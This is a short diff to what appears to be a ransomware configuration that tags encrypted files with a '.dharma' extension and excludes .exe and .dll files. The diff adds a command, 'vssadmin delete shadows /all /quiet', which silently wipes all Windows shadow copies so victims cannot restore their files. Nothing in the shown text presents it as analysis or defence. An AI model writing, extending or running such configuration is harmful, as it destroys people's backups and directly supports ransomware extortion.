@@ -1,4 +1,6 @@
 file_extension: .dharma
+command:
+  - vssadmin delete shadows /all /quiet
 exclude:
   - .exe
   - .dll
